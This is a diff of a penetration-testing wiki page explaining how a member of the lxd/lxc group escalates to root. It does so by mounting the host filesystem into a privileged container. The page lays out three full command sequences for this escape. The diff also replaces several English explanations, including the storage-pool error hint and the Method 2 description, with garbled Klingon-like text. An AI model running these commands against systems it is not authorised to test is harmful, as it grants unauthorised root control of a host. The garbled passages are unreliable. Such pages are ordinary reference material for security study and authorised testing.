@@ -21,7 +21,6 @@ If you belong to _**lxd**_ **or** _**lxc**_ **group**, you can become root
 ### Method 1
 
 You can install in your machine this distro builder: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(follow the instructions of the github):
-
 ```bash
 sudo su
 #Install requirements
@@ -39,9 +38,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 #Create the container
 sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
 ```
-
-Upload the files **lxd.tar.xz** and **rootfs.squashfs**, add the image to the repo and create a container:
-
+**lxd.tar.xz** and **rootfs.squashfs** files should be uploaded. The image should be added to the repo and a container should be created.
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -56,24 +53,20 @@ lxc list
 
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
-
 {% hint style="danger" %}
-If you find this error _**Error: No storage pool found. Please create a new storage pool**_\
-Run **`lxd init`** and **repeat** the previous chunk of commands
+QaparHa' 'ej _**QaparHa': QaparHa' storage pool found. QaparHa' storage pool**_\
+**`lxd init`** 'ej **QaparHa'** previous chunk of commands
 {% endhint %}
 
 Finally you can execute the container and get root:
-
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
-
 ### Method 2
 
-Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.
-
+Alpine be'Hom vItlhutlh 'ej 'oH vItlhutlh flag `security.privileged=true` lo'laHbe'lu', container root jatlh host filesystem vItlhutlh.
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -84,7 +77,7 @@ sudo ./build-alpine -a i686
 # import the image
 lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.
 
-# before running the image, start and configure the lxd storage pool as default 
+# before running the image, start and configure the lxd storage pool as default
 lxd init
 
 # run the image
@@ -97,21 +90,18 @@ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursiv
 lxc start mycontainer
 lxc exec mycontainer /bin/sh
 ```
-
 Alternatively [https://github.com/initstring/lxd\_root](https://github.com/initstring/lxd\_root)
 
 ## With internet
 
 You can follow [these instructions](https://reboare.github.io/lxd/lxd-escape.html).
-
 ```bash
 lxc init ubuntu:16.04 test -c security.privileged=true
-lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
+lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
 lxc start test
 lxc exec test bash
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
-
 ## References
 
 * [https://reboare.github.io/lxd/lxd-escape.html](https://reboare.github.io/lxd/lxd-escape.html)
